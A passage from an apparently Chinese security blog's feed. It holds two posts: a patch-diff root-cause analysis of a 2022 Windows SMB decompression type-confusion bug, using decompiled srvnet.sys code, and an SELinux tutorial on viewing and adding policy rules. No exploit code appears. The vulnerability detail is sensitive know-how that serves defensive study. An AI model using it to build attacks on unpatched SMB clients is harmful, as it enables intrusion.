    <content type="html"><![CDATA[<p>2022年8月更新中出现了SMB的RCE, 微软介绍说对于server端是认证后的, 所以应该不会是历史漏洞重新出现的问题, 毕竟曾经也分析过一阵子SMB, 出现了新鲜漏洞还是需要分析分析的, 以下是一个简单的分析介绍</p><span id="more"></span><h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>首先官方介绍是压缩相关的bug, 对比<code>srv2.sys</code>和<code>srvnet.sys</code>后,  发现<code>srvnet.sys</code>的<code>SmbCompressionDecompress</code>有改动, 所以大概率是它了.</p><p>以下是相关改动:</p><p><img src="/images/CVE-2022-35804/1660184030021.png" alt="1660184030021"></p><p>从图中看到, 改动其实很小, 就改了最后一个传入参数.</p><p>查看MSDN对于该函数的说明:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">NT_RTL_COMPRESS_API NTSTATUS <span class="title function_">RtlDecompressBufferEx2</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]           USHORT CompressionFormat,</span></span><br><span class="line"><span class="params">  [out]          PUCHAR UncompressedBuffer,</span></span><br><span class="line"><span class="params">  [in]           ULONG  UncompressedBufferSize,</span></span><br><span class="line"><span class="params">  [in]           PUCHAR CompressedBuffer,</span></span><br><span class="line"><span class="params">  [in]           ULONG  CompressedBufferSize,</span></span><br><span class="line"><span class="params">  [in]           ULONG  UncompressedChunkSize,</span></span><br><span class="line"><span class="params">  [out]          PULONG FinalUncompressedSize,</span></span><br><span class="line"><span class="params">  [in, optional] PVOID  WorkSpace</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">[in, optional] WorkSpace</span><br><span class="line"></span><br><span class="line">A pointer to a caller-allocated work space buffer used by the RtlDecompressBufferEx2 function during decompression. Use the RtlGetCompressionWorkSpaceSize function to determine the correct work space buffer size.</span><br></pre></td></tr></table></figure><p>所以可以了解到, workspace理应是caller申请的一块内存. </p><p>一般来说, 应该是如下的形式调用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(NT_SUCCESS(RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, &amp;CompressBufferWorkSpaceSize, &amp;CompressFragmentWorkSpaceSize)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(WorkSpace = LocalAlloc(LPTR, CompressBufferWorkSpaceSize))</span><br><span class="line">&#123;</span><br><span class="line">            status = NT_SUCCESS(RtlDecompressBufferEx2(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, (PUCHAR) data, size, (PUCHAR) (*compressedData), size, <span class="number">4096</span>, compressedSize, WorkSpace));</span><br><span class="line">LocalFree(WorkSpace);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先调用<code>RtlGetCompressionWorkSpaceSize</code>获取需要的workspace的size, 然后申请对应大小的内存, 之后再调用解压缩函数.</p><p>接下来, 我们看看<code>P</code>到底是个什么东西.<br>在<code>SmbCompressionInitialize</code>函数内, 它初始化了全局变量<code>P</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">CompressionWorkSpaceSize = RtlGetCompressionWorkSpaceSize(</span><br><span class="line">                             <span class="number">2u</span>,</span><br><span class="line">                             &amp;CompressBufferWorkSpaceSize,</span><br><span class="line">                             &amp;CompressFragmentWorkSpaceSize);</span><br><span class="line"><span class="keyword">if</span> ( CompressionWorkSpaceSize &lt; <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">v1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( CompressBufferWorkSpaceSize )</span><br><span class="line">  v1 = CompressBufferWorkSpaceSize;</span><br><span class="line">CompressionWorkSpaceSize = RtlGetCompressionWorkSpaceSize(</span><br><span class="line">                             <span class="number">3u</span>,</span><br><span class="line">                             &amp;CompressBufferWorkSpaceSize,</span><br><span class="line">                             &amp;CompressFragmentWorkSpaceSize);</span><br><span class="line"><span class="keyword">if</span> ( CompressionWorkSpaceSize &lt; <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_12;</span><br><span class="line"><span class="keyword">if</span> ( CompressBufferWorkSpaceSize &gt; v1 )</span><br><span class="line">  v1 = CompressBufferWorkSpaceSize;</span><br><span class="line">CompressionWorkSpaceSize = RtlGetCompressionWorkSpaceSize(</span><br><span class="line">                             <span class="number">4u</span>,</span><br><span class="line">                             &amp;CompressBufferWorkSpaceSize,</span><br><span class="line">                             &amp;CompressFragmentWorkSpaceSize);</span><br><span class="line"><span class="keyword">if</span> ( CompressionWorkSpaceSize &lt; <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_12;</span><br><span class="line"><span class="keyword">if</span> ( CompressBufferWorkSpaceSize &gt; v1 )</span><br><span class="line">  v1 = CompressBufferWorkSpaceSize;</span><br><span class="line">P = (PVOID)PplCreateLookasideList(<span class="number">0</span>, <span class="number">0</span>, v1, <span class="number">0x2532534C</span>u, v3, <span class="number">0x2532534C</span>u);</span><br></pre></td></tr></table></figure><p>可以看到, 它应该是放入了3种压缩类型所需要的size中最大的那一个到<code>lookaside list</code>里,  <code>P</code>就是指向<code>lookaside list</code>结构体的指针. 可见它并不是<code>RtlDecompressBufferEx2</code>想要的<code>workspace</code>结构体.</p><p>正常情况下, 在第一个图的修补后的第58行, 它会调用<code>P</code>的allocate函数, 去申请最大的那个size的workspace.</p><p>然而, 由于程序员手抖, 不小心传入了<code>P</code>, 导致了类型混淆, 从而造成了对<code>P</code>的写入问题.</p><h1 id="History"><a href="#History" class="headerlink" title="History"></a>History</h1><p>在windows 10 1909的代码中, <code>SmbCompressionDecompress</code>是这样实现的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( RtlGetCompressionWorkSpaceSize(v13, &amp;CompressBufferWorkSpaceSize, (PULONG)CompressFragmentWorkSpaceSize) &lt; <span class="number">0</span></span><br><span class="line">  || (PoolWithTag = ExAllocatePoolWithTag((POOL_TYPE)<span class="number">512</span>, CompressBufferWorkSpaceSize, <span class="number">0x2532534C</span>u)) != <span class="number">0</span>i64 )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = RtlDecompressBufferEx2(v13, a4, (<span class="type">unsigned</span> <span class="type">int</span>)a5, a2, a3, <span class="number">0</span>, a6, PoolWithTag);</span><br><span class="line">  <span class="keyword">if</span> ( PoolWithTag )</span><br><span class="line">    ExFreePoolWithTag(PoolWithTag, <span class="number">0x2532534C</span>u);</span><br></pre></td></tr></table></figure><p>可见没有任何问题, 在windows 10 2004里, 开始变了模样, 但是参数传递是修补后的样子. 之前保存过windows 20211(发布于2020年9月)的<code>srvnet.sys</code>文件, 发现它是传递了<code>P</code>, 所以可以看到, 这个bug应该某个开发版引入的, 一直延续到了windows 11. </p><p>有意思的是, 它的变量类型是<code>PVOID</code>, 而<code>P</code>也是<code>PVOID</code>, 所以编译器不会有任何警告. 理论上只要有任何测试触发这个位置, 这块代码都有可能会崩溃, 但是直到如今, 才被爆出来, 也是出人意料的, 可见微软内部的安全审计依然不到位(也许就没有).</p><blockquote><p>我想微软之所以那么改, 可能是为了提高内存利用效率, 避免频繁的申请内存吧, 没想到搞出这等幺蛾子, 哈哈哈</p></blockquote><h1 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h1><p>好在, 自从windows 爆出过压缩部分的bug后, 它已经要求server端先验证, 后压缩, 使得bug只能是认证后才能触发. 但是Client端还是会受影响的, 毕竟client主动连的server, 也就不存在认证限制了.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2022年8月更新中出现了SMB的RCE, 微软介绍说对于server端是认证后的, 所以应该不会是历史漏洞重新出现的问题, 毕竟曾经也分析过一阵子SMB, 出现了新鲜漏洞还是需要分析分析的, 以下是一个简单的分析介绍&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SELinux 简介</title>
    <link href="http://474172261.github.io/2022/06/17/SELinux/"/>
    <id>http://474172261.github.io/2022/06/17/SELinux/</id>
    <published>2022-06-17T11:38:05.968Z</published>
    <updated>2022-05-09T07:42:34.136Z</updated>
    
    <content type="html"><![CDATA[<p>测试中时常涉及到SELinux, 但是又不太懂咋回事. 学习一下, 整理出来, 希望可以帮到有疑惑的人</p><span id="more"></span><p>默认情况下, linux的权限隔离是依据用户的权限来划分的, 称为自主访问控制(DAC). 而SELinux是根据进程和资源划分类和访问权限的. 两者不矛盾, 可以一起存在. </p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>要使用和管理selinux, 需要一些命令, 需要安装一下:</p><p>以centos7为例:</p><p><code>sesearch</code>: <code>yum install setools-console</code></p><p><code>semanage</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ yum provides semanage</span><br><span class="line">...</span><br><span class="line">policycoreutils-python-2.5-34.el7.x86_64 : SELinux policy core python utilities</span><br><span class="line">Repo        : base</span><br><span class="line">Matched from:</span><br><span class="line">Filename    : /usr/sbin/semanage</span><br><span class="line"></span><br><span class="line">$ yum install policycoreutils-python-2.5-34.el7.x86_64</span><br></pre></td></tr></table></figure><p><code>sealert</code>:  与semanage类似. 比如centos7是<code>yum install setroubleshoot-server-3.2.30-8.el7.x86_64</code>. 当然没有它也不要紧.</p><h1 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h1><ol><li><code>enforcing</code>：强制模式。违反 SELinux 规则的行为将被<strong>阻止</strong>并<strong>记录到日志中</strong>。</li><li><code>permissive</code>：宽容模式。违反 SELinux 规则的行为只会<strong>记录到日志中</strong>。一般为调试用。</li><li><code>disabled</code>：关闭 SELinux。</li></ol><p>通过命令<code>getenforce</code>可以查看当前状态, 通过<code>setenforce</code>可以更改它.</p><blockquote><p>Ubuntu如果没有命令, 可以<code>apt install selinux-utils</code>安装. 默认情况下Ubuntu不启用SELinux, 而是apparmor</p></blockquote><h1 id="查看规则"><a href="#查看规则" class="headerlink" title="查看规则"></a>查看规则</h1><p>使用<code>sesearch -A</code>可以查看所有允许的规则. (非”允许规则”就是不允许)</p><p>举例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sesearch -A|grep syslogd_t</span><br><span class="line">allow syslogd_t tmp_t : dir &#123; ioctl read write getattr lock add_name remove_name search open &#125; ;</span><br></pre></td></tr></table></figure><p>格式为<code>ALLOW (src type) (dst type):class &#123; allowed attributes &#125;;</code></p><p>通过<code>chcon -u aaa_u -r bbb_r -t ccc_t test</code>可以临时修改文件的规则</p><p><code>semanage fcontext --list</code> 可以查看文件或者文件夹对于的type规则.</p><p><code>semodule -l</code>可以查看已经安装的module里封装的规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ semodule -l</span><br><span class="line">...</span><br><span class="line">varnishd        1.2.0</span><br><span class="line">vdagent 1.1.1</span><br><span class="line">vhostmd 1.1.0</span><br><span class="line">virt    1.5.0</span><br><span class="line">vlock   1.2.0</span><br><span class="line">vmtools 1.0.0</span><br><span class="line">vmware  2.7.0</span><br><span class="line">vnstatd 1.1.0</span><br><span class="line">vpn     1.16.0</span><br><span class="line">w3c     1.1.0</span><br><span class="line">watchdog        1.8.0</span><br><span class="line">wdmd    1.1.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果我们想了解vmtools的规则, 可以这样:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ semodule -E vmtools</span><br></pre></td></tr></table></figure><p>执行完成后, 可以看到目录下生成了vmtools.pp文件.</p><p>使用<code>sedismod</code>查看规则:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ sedismod vmtools.pp</span><br><span class="line">Reading policy...</span><br><span class="line">libsepol.policydb_index_others: security:  0 users, 4 roles, 112 types, 4 bools</span><br><span class="line">libsepol.policydb_index_others: security: 1 sens, 1024 cats</span><br><span class="line">libsepol.policydb_index_others: security:  101 classes, 0 rules, 0 cond rules</span><br><span class="line">libsepol.policydb_index_others: security:  0 users, 4 roles, 112 types, 4 bools</span><br><span class="line">libsepol.policydb_index_others: security: 1 sens, 1024 cats</span><br><span class="line">libsepol.policydb_index_others: security:  101 classes, 0 rules, 0 cond rules</span><br><span class="line">Binary policy module file loaded.</span><br><span class="line">Module name: vmtools</span><br><span class="line">Module version: 1.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Select a command:</span><br><span class="line">1)  display unconditional AVTAB</span><br><span class="line">2)  display conditional AVTAB</span><br><span class="line">3)  display users</span><br><span class="line">4)  display bools</span><br><span class="line">5)  display roles</span><br><span class="line">6)  display types, attributes, and aliases</span><br><span class="line">7)  display role transitions</span><br><span class="line">8)  display role allows</span><br><span class="line">9)  Display policycon</span><br><span class="line">0)  Display initial SIDs</span><br><span class="line"></span><br><span class="line">a)  Display avrule requirements</span><br><span class="line">b)  Display avrule declarations</span><br><span class="line">c)  Display policy capabilities</span><br><span class="line">l)  Link in a module</span><br><span class="line">u)  Display the unknown handling setting</span><br><span class="line">F)  Display filename_trans rules</span><br><span class="line"></span><br><span class="line">f)  set output file</span><br><span class="line">m)  display menu</span><br><span class="line">q)  quit</span><br><span class="line"></span><br><span class="line">Command (&#x27;m&#x27; for menu):</span><br></pre></td></tr></table></figure><p>这里我们输入1, 显示unconditional规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unconditional avtab:</span><br><span class="line">--- begin avrule block ---</span><br><span class="line">decl 1:</span><br><span class="line">  allow vmtools_t vmtools_exec_t : [file] &#123; entrypoint &#125;;</span><br><span class="line">  allow vmtools_t vmtools_exec_t : [file] &#123; ioctl read getattr lock map execute execute_no_trans open &#125;;</span><br><span class="line">  type_transition [initrc_domain] vmtools_exec_t : [process]  vmtools_t;</span><br><span class="line">  allow vmtools_helper_t vmtools_helper_exec_t : [file] &#123; entrypoint &#125;;</span><br><span class="line">  allow vmtools_helper_t vmtools_helper_exec_t : [file] &#123; ioctl read getattr lock map execute execute_no_trans open &#125;;</span><br><span class="line">  allow vmtools_t self : [capability] &#123; sys_rawio sys_time &#125;;</span><br><span class="line">  allow vmtools_t self : [fifo_file] &#123; ioctl read write getattr lock append open &#125;;</span><br><span class="line">  allow vmtools_t self : [unix_stream_socket] &#123; ioctl read write create getattr setattr lock append bind connect listen accept getopt setopt shutdown &#125;;</span><br><span class="line">  allow vmtools_t self : [unix_dgram_socket] &#123; ioctl read write create getattr setattr lock append bind connect getopt setopt shutdown &#125;;</span><br><span class="line">  allow vmtools_t vmtools_tmp_t : [dir] &#123; ioctl read write getattr lock add_name remove_name search open &#125;;</span><br><span class="line">  allow vmtools_t vmtools_tmp_t : [dir] &#123; ioctl read write create getattr setattr lock unlink link rename add_name remove_name reparent search rmdir open &#125;;</span><br><span class="line">  allow vmtools_t vmtools_tmp_t : [dir] &#123; ioctl read write getattr lock add_name remove_name search open &#125;;</span><br><span class="line">  allow vmtools_t vmtools_tmp_t : [file] &#123; ioctl read write create getattr setattr lock append unlink link rename open &#125;;</span><br><span class="line">  allow vmtools_t vmtools_tmp_t : [dir] &#123; ioctl read</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure><h1 id="Security-Context"><a href="#Security-Context" class="headerlink" title="Security Context"></a>Security Context</h1><p><img src="/images/SELinux/v2-bb095bfd7450ecbcc799323ef62f66cc_720w.jpg" alt="img"></p><p>进程的type也称为Domain.</p><p>unconfined_t是无限制的domain. 一般登录用户启动的程序为这个domain.</p><p><code>ls -Z</code>可以查看文件的security context.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost vv]# ls -Z /root/</span><br><span class="line">-rw-------. root root system_u:object_r:admin_home_t:s0 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. root root system_u:object_r:admin_home_t:s0 initial-setup-ks.cfg</span><br><span class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 t2</span><br></pre></td></tr></table></figure><p><code>ps -auxZ</code>可以查看进程的security context.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system_u:system_r:kernel_t:s0   root        569  0.0  0.0      0     0 ?        S&lt;   May04   0:00 [xfs-eofblocks/s]</span><br><span class="line">system_u:system_r:kernel_t:s0   root        572  0.0  0.0      0     0 ?        S    May04   0:00 [xfsaild/sda1]</span><br><span class="line">system_u:system_r:auditd_t:s0   root        654  0.0  0.0  55504   460 ?        S&lt;sl May04   0:00 /sbin/auditd</span><br><span class="line">system_u:system_r:audisp_t:s0   root        656  0.0  0.0  84548   580 ?        S&lt;sl May04   0:00 /sbin/audispd</span><br></pre></td></tr></table></figure><h1 id="Domain-Transition"><a href="#Domain-Transition" class="headerlink" title="Domain Transition"></a>Domain Transition</h1><p>假如进程A属于Domain a, 它启动了一个程序X, 程序X启动后的Domain是Domain b. 我们就称之为Domain Transition.</p><p>实现这个需要满足3个前提:</p><ol><li><p>Domain a 和Domain b有程序文件X的 execute 属性</p></li><li><p>Domain a允许迁移到Domain b. (即 process transition 属性)</p></li><li><p>文件X是Domain b的 entrypoint. 比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sesearch -A|grep vmtools_t|grep entrypoint</span><br><span class="line">   allow vmtools_t vmtools_exec_t : file &#123; ioctl read getattr lock map execute execute_no_trans entrypoint open &#125; ;</span><br></pre></td></tr></table></figure><blockquote><p>如果是在pp文件里, 就形如 <code>type_transition [initrc_domain] vmtools_exec_t : [process]  vmtools_t;</code></p></blockquote></li></ol><p>举例: <strong>init_t</strong>到<strong>httpd_t</strong>的Domain Transition:</p><p>先查看vftpd的文件和进程的security context:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ls -Z /usr/sbin/vsftpd</span><br><span class="line">-rwxr-xr-x. root root system_u:object_r:ftpd_exec_t:s0 /usr/sbin/vsftpd</span><br><span class="line">[root@localhost ~]# ps -auxZ|grep vftpd</span><br><span class="line">system_u:object_r:ftpd_t:s0-s0:c0.c1023 root 2829 0.0  0.0 112660 964 pts/1 R+ 07:42   0:00 grep --color=auto vftpd</span><br></pre></td></tr></table></figure><p>可以看到文件是ftpd_exec_t type, 进程的domain是ftpd_t( 如果没有配置SELinux, 进程的security context可能是unconfined_u:unconfined_r:unconfined_t)</p><p>接下来查看init_t到ftpd_exec_t的规则:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# sesearch -s init_t -t ftpd_exec_t -c file -p execute -Ad</span><br><span class="line">Found 1 semantic av rules:</span><br><span class="line">   allow init_t ftpd_exec_t : file &#123; read getattr execute open &#125; ; </span><br></pre></td></tr></table></figure><p>可以看到init_t有ftpd_exec_t Type的execute属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# sesearch -s ftpd_t -t ftpd_exec_t -c file -p entrypoint -Ad</span><br><span class="line">Found 1 semantic av rules:</span><br><span class="line">   allow ftpd_t ftpd_exec_t : file &#123; ioctl read getattr lock execute execute_no_trans entrypoint open &#125; ;</span><br></pre></td></tr></table></figure><p>可以看到ftpd_t有ftpd_exec_t Type的execute属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# sesearch -s init_t -t ftpd_t -c process -p transition -Ad</span><br><span class="line">Found 1 semantic av rules:</span><br><span class="line">   allow init_t ftpd_t : process transition ;</span><br></pre></td></tr></table></figure><h1 id="错误信息的处理"><a href="#错误信息的处理" class="headerlink" title="错误信息的处理"></a>错误信息的处理</h1><p>通过<code>ausearch</code>命令可以获取错误消息. 也可以直接读取<code>/var/log/audit/audit.log</code>, 带有<code>AVC</code>(Access Vector Cache, 很奇葩的名字)的就是拒绝的log.</p><p>比如: 执行<code>runcon system_u:system_r:syslogd_t:s0 /bin/ls -l /</code>会失败, 查看错误结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ausearch -m AVC,USER_AVC,SELINUX_ERR,USER_SELINUX_ERR|grep runcon</span><br><span class="line">type=AVC msg=audit(1651855998.065:528): avc:  denied  &#123; entrypoint &#125; for  pid=4634 comm=&quot;runcon&quot; path=&quot;/usr/bin/ls&quot; dev=&quot;dm-0&quot; ino=25307027 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:bin_t:s0 tclass=file</span><br></pre></td></tr></table></figure><ul><li><code>avc: denied</code> - the action performed by SELinux and recorded in Access Vector Cache (AVC)</li><li><code>&#123; entrypoint&#125;</code> - the denied action</li><li><code>pid=4634</code>- the process identifier of the subject that tried to perform the denied action</li><li><code>comm=&quot;runcon&quot;</code> - the name of the command that was used to invoke the analyzed process</li><li><code>syslogd_t</code> - the SELinux type of the process</li><li><code>bin_t</code> - the SELinux type of the object affected by the process action</li><li><code>tclass=file</code> - the target object class</li></ul><p>翻译一下就是, 进程runcon(pid:4634)下从syslogd_t类型去运行bin_t类型的 “&#x2F;usr&#x2F;bin&#x2F;ls”文件时, syslogd_t没有该文件的entrypoint权限. </p><p>这是为什么呢? 我的猜想是, runcon由于是用户启动的, 所以在unconfined_t域, runcon会调用<code>setexeccon</code>, 该函数功能是在下一次执行execve的时候, 更改加载程序的security context. 这个操作应该会触发一个Domain Transition, 从unconfined_t 到 syslogd_t, 而Domain Transition有3个前提, 其中一个是就是需要目标domain有文件的entrypoint属性. 而syslogd_t没有bint_t的entrypoint属性. 从而导致没有权限.</p><h1 id="添加规则"><a href="#添加规则" class="headerlink" title="添加规则"></a>添加规则</h1><p>使用audit2allow可以生成规则建议:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ausearch -m AVC|grep  runcon</span><br><span class="line">type=AVC msg=audit(1651857472.707:540): avc:  denied  &#123; entrypoint &#125; for  pid=4774 comm=&quot;runcon&quot; path=&quot;/usr/bin/ls&quot; dev=&quot;dm-0&quot; ino=25307027 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:bin_t:s0 tclass=file</span><br><span class="line">[root@localhost ~]# ausearch -m AVC|grep  runcon|audit2allow -a</span><br><span class="line"></span><br><span class="line">#============= syslogd_t ==============</span><br><span class="line"></span><br><span class="line">#!!!! WARNING: &#x27;bin_t&#x27; is a base type.</span><br><span class="line">allow syslogd_t bin_t:file entrypoint;</span><br></pre></td></tr></table></figure><p>生成规则:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ausearch -m AVC|grep  runcon|audit2allow -M test2</span><br><span class="line">******************** IMPORTANT ***********************</span><br><span class="line">To make this policy package active, execute:</span><br><span class="line"></span><br><span class="line">semodule -i test2.pp</span><br></pre></td></tr></table></figure><p>它会生成两个文件<code>test2.pp</code>和<code>test2.te</code>, te文件就是规则的实际描述文件,</p><p>安装规则: <code>semodule -i test2.pp</code></p><p>安装后查看:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# sesearch -A|grep syslogd_t|grep entrypoint</span><br><span class="line">   allow syslogd_t bin_t : file &#123; ioctl read getattr lock map execute execute_no_trans entrypoint open &#125; ;</span><br><span class="line">   allow syslogd_t syslogd_exec_t : file &#123; ioctl read getattr lock map execute execute_no_trans entrypoint open &#125; ;</span><br></pre></td></tr></table></figure><p>可以看到规则已经添加进去了.</p><p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security-enhanced_linux/sect-security-enhanced_linux-fixing_problems-allowing_access_audit2allow">ALLOWING ACCESS: AUDIT2ALLOW</a></p><p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/using_selinux/writing-a-custom-selinux-policy_using-selinux">WRITING A CUSTOM SELINUX POLICY</a></p><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><p>通过<code>runcon</code>可以以特定domain运行特定程序</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.digitalocean.com/community/tutorials/an-introduction-to-selinux-on-centos-7-part-2-files-and-processes">An Introduction to SELinux on CentOS 7 – Part 2: Files and Processes</a></p><p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/using_selinux/writing-a-custom-selinux-policy_using-selinux">WRITING A CUSTOM SELINUX POLICY</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;测试中时常涉及到SELinux, 但是又不太懂咋回事. 学习一下, 整理出来, 希望可以帮到有疑惑的人&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
